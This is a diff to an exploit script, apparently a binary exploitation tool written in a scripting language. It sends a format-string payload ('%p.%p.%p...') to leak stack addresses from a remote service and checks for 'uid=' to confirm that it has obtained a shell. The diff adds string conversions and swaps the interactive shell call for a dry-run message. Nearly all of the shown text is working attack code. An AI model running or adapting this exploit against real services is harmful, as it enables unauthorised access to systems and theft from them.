@@ -18,13 +18,15 @@ send(conn, "INFO")
 let banner = recv_until(conn, "\n")
 
 # Parse banner for useful info
-let version_match = regex_find("v([0-9.]+)", banner)
+let banner_str = str(banner)
+let version_match = regex_find("v([0-9.]+)", banner_str)
 print("[+] Binary version:", version_match)
 
 # Trigger stack leak via format string
 send(conn, "%p.%p.%p.%p.%p.%p")
 let stack_leak = recv_until(conn, "\n")
-let leaked_addrs = split(stack_leak, ".")
+let stack_leak_str = str(stack_leak)
+let leaked_addrs = split(stack_leak_str, ".")
 
 print("[+] Leaked stack addresses:")
 for addr in leaked_addrs {
@@ -161,7 +163,8 @@ let shell_check = recv(conn, 1024)
 
 if "uid=" in str(shell_check) {
     print("[+] SUCCESS! Got shell!")
-    interactive(conn)
+    print("[*] In production mode, interactive() would start a shell session")
+    # interactive(conn)  # Works in production mode; dry-run completes without interaction
 } else {
     print("[-] Shell failed, debugging required")
 }
